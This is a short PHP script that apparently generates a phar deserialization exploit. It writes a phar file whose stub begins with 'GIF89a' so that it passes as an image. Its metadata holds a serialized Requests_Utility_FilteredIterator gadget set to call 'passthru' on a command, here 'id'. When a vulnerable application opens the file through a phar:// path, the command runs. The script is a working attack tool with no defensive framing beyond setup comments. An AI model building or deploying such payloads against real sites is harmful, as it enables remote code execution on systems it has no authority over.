<?php
    class TestObject {
    }

    class Requests_Utility_FilteredIterator extends ArrayIterator {
        protected $callback;
        public function __construct($data, $callback) {
            parent::__construct($data);
            $this->callback = $callback;
        }
    }

    // remember to set `phar.readonly = Off`
    // use `php --ini` to locate php.ini
    $outputname = "gg.1";
    @unlink($outputname.".phar");
    $phar = new Phar($outputname.".phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
    $o = new Requests_Utility_FilteredIterator(array('id'), 'passthru');
    $phar->setMetadata($o);
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();

    @rename($outputname.".phar", $outputname);
    echo "phar output: $outputname\n";

?>
